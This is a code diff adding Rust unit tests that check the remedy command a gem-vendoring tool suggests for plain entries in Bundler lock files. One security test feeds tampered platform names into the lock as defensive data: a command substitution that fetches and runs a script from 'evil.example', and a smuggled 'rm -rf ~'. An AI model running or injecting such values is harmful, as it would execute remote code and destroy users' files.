@@ -12356,6 +12356,168 @@ mod tests {
             assert!(err.contains("platform-suffixed"), "{err}");
         }
 
+        /// The lock Bundler 4 writes for nokogiri 1.19.7 and thruster 0.1.28
+        /// (#2284), with `platforms` as its `PLATFORMS` lines. thruster has
+        /// no build for 32-bit ARM, so Bundler keeps its plain entry for
+        /// `arm-linux-gnu` and `arm-linux-musl` whether or not `ruby` is
+        /// locked. `noko_plain` adds nokogiri's plain entry, which Bundler
+        /// keeps for `ruby` alone.
+        fn rails_lock(platforms: &[&str], noko_plain: bool) -> String {
+            let mut specs = String::new();
+            if noko_plain {
+                specs.push_str(
+                    "    nokogiri (1.19.7)\n      mini_portile2 (~> 2.8.2)\n      racc (~> 1.4)\n",
+                );
+            }
+            for platform in [
+                "aarch64-linux-gnu",
+                "aarch64-linux-musl",
+                "arm-linux-gnu",
+                "arm-linux-musl",
+                "arm64-darwin",
+                "x86_64-darwin",
+                "x86_64-linux-gnu",
+                "x86_64-linux-musl",
+            ] {
+                specs.push_str(&format!(
+                    "    nokogiri (1.19.7-{platform})\n      racc (~> 1.4)\n"
+                ));
+            }
+            specs.push_str("    racc (1.8.1)\n    thruster (0.1.28)\n");
+            for platform in [
+                "aarch64-linux",
+                "arm64-darwin",
+                "x86_64-darwin",
+                "x86_64-linux",
+            ] {
+                specs.push_str(&format!("    thruster (0.1.28-{platform})\n"));
+            }
+            let platforms: String = platforms.iter().map(|p| format!("  {p}\n")).collect();
+            format!(
+                "GEM\n  remote: https://rubygems.org/\n  specs:\n{specs}\nPLATFORMS\n{platforms}\nDEPENDENCIES\n  nokogiri (= 1.19.7)\n  thruster (= 0.1.28)\n\nBUNDLED WITH\n  4.0.18\n"
+            )
+        }
+
+        const RAILS_PLATFORMS: [&str; 10] = [
+            "aarch64-linux",
+            "aarch64-linux-gnu",
+            "aarch64-linux-musl",
+            "arm-linux-gnu",
+            "arm-linux-musl",
+            "arm64-darwin",
+            "ruby",
+            "x86_64-darwin",
+            "x86_64-linux-gnu",
+            "x86_64-linux-musl",
+        ];
+
+        /// The plain-entry refusal of `name` in `lock`.
+        fn plain_entry_detail(lock: &str, name: &str, version: &str) -> String {
+            let locked = locked_gem(&crate::formats::gem::parse(lock), name, version);
+            assert!(locked.plain, "{name} must hold a plain entry");
+            let (code, detail) = platform_lock_refusal(name, version, &locked, lock)
+                .expect("a plain entry beside platform gems is refused");
+            assert_eq!(code, "platform_gem_unsupported");
+            detail
+        }
+
+        /// #2284: Bundler keeps the plain entry for every locked platform
+        /// that none of the gem's builds serves, not only for `ruby`. The
+        /// remedy names each of them, so following it clears the entry. A
+        /// gem whose builds cover every platform but `ruby` keeps the
+        /// one-platform remedy.
+        #[test]
+        fn the_plain_entry_remedy_names_every_platform_no_build_serves() {
+            for eol in ["\n", "\r\n"] {
+                let lock = rails_lock(&RAILS_PLATFORMS, true).replace('\n', eol);
+                let thruster = plain_entry_detail(&lock, "thruster", "0.1.28");
+                assert!(
+                    thruster.contains(
+                        "(`bundle lock --remove-platform arm-linux-gnu arm-linux-musl ruby`)"
+                    ),
+                    "{thruster}"
+                );
+                assert!(
+                    thruster.contains("`arm-linux-gnu`, `arm-linux-musl`, `ruby`"),
+                    "{thruster}"
+                );
+                assert!(thruster.ends_with("to vendor thruster"), "{thruster}");
+                let nokogiri = plain_entry_detail(&lock, "nokogiri", "1.19.7");
+                assert!(
+                    nokogiri.ends_with(
+                        "Remove the ruby platform from the lock (`bundle lock --remove-platform ruby`) to vendor nokogiri"
+                    ),
+                    "{nokogiri}"
+                );
+            }
+        }
+
+        /// #2284, after `bundle lock --remove-platform ruby` was followed
+        /// (and the lock Bundler 4 writes for the project from the start):
+        /// `ruby` is not a locked platform, so the remedy must not name it.
+        /// Running that command again fails.
+        #[test]
+        fn the_plain_entry_remedy_never_names_a_ruby_platform_the_lock_lacks() {
+            let without_ruby: Vec<&str> = RAILS_PLATFORMS
+                .iter()
+                .copied()
+                .filter(|p| *p != "ruby")
+                .collect();
+            let lock = rails_lock(&without_ruby, false);
+            let detail = plain_entry_detail(&lock, "thruster", "0.1.28");
+            assert!(
+                detail.contains("(`bundle lock --remove-platform arm-linux-gnu arm-linux-musl`)"),
+                "{detail}"
+            );
+            assert!(!detail.contains("--remove-platform ruby"), "{detail}");
+            assert!(!detail.contains("Remove the ruby platform"), "{detail}");
+        }
+
+        /// When the lock names no platform to point at (every locked
+        /// platform is served, or the lock has no `PLATFORMS`), the remedy
+        /// names none: it says what keeps the entry and leaves the
+        /// platform open.
+        #[test]
+        fn the_plain_entry_remedy_names_no_platform_it_cannot_find() {
+            let served = rails_lock(&["arm64-darwin", "x86_64-linux-gnu"], false);
+            let no_section =
+                served.replace("PLATFORMS\n  arm64-darwin\n  x86_64-linux-gnu\n\n", "");
+            assert!(!no_section.contains("PLATFORMS"));
+            for lock in [served, no_section] {
+                let detail = plain_entry_detail(&lock, "thruster", "0.1.28");
+                assert!(
+                    detail.contains("(`bundle lock --remove-platform <platform>`)"),
+                    "{detail}"
+                );
+                assert!(!detail.contains("--remove-platform ruby"), "{detail}");
+            }
+        }
+
+        /// SECURITY: `PLATFORMS` is a committed, tamper-able section, and
+        /// the remedy is a command the user copies. A platform that is not
+        /// a plain gem token is never printed.
+        #[test]
+        fn the_plain_entry_remedy_prints_no_unsafe_platform() {
+            let lock = rails_lock(
+                &[
+                    "arm-linux-gnu",
+                    "$(curl evil.example|sh)",
+                    "x; rm -rf ~",
+                    "ruby",
+                ],
+                false,
+            );
+            let detail = plain_entry_detail(&lock, "thruster", "0.1.28");
+            assert!(
+                detail.contains("(`bundle lock --remove-platform arm-linux-gnu ruby`)"),
+                "{detail}"
+            );
+            assert!(
+                !detail.contains("curl") && !detail.contains("rm -rf"),
+                "{detail}"
+            );
+        }
+
         /// A native gem locked for the ruby platform alone is still refused,
         /// whatever the service has: bundler would build it from source, and
         /// never does for a `path:` gem. The service is not asked.
